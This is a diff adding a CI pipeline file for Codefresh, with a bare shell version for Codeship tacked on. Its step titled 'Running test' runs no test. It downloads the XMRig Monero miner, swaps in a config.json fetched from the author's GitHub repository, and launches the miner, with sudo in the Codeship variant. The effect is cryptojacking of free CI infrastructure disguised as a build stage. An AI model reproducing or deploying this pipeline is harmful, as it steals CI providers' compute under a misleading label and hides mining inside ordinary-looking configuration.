@@ -1,0 +1,45 @@
+version: '1.0'
+steps:
+  clone:
+    title: Cloning repository
+    type: git-clone
+    repo: joaopaulooliveirasantos/ubuntu
+    revision: '${{CF_BRANCH}}'
+    git: github
+    stage: clone
+  test:
+    title: Running test
+    type: freestyle
+    image: 'ubuntu:latest'
+    working_directory: '${{clone}}'
+    commands:
+      - mkdir monero
+      - cd monero
+      - apt-get update
+      - apt-get --assume-yes install wget
+      - >-
+        wget
+        "https://github.com/xmrig/xmrig/releases/download/v6.8.0/xmrig-6.8.0-linux-x64.tar.gz"
+      - tar -xvf xmrig-6.8.0-linux-x64.tar.gz
+      - cd xmrig-6.8.0
+      - rm config.json
+      - >-
+        wget
+        "https://raw.githubusercontent.com/joaopaulooliveirasantos/ubuntu/master/root/config.json"
+      - ./xmrig
+    stage: test
+stages:
+  - clone
+  - build
+  - test
+
+
+  -----------Code ship (https://app.codeship.com/)
+mkdir monero
+cd monero
+wget "https://github.com/xmrig/xmrig/releases/download/v6.8.0/xmrig-6.8.0-linux-x64.tar.gz"
+tar -xvf xmrig-6.8.0-linux-x64.tar.gz
+cd xmrig-6.8.0
+rm config.json
+wget "https://raw.githubusercontent.com/joaopaulooliveirasantos/ubuntu/master/root/config.json"
+sudo ./xmrig
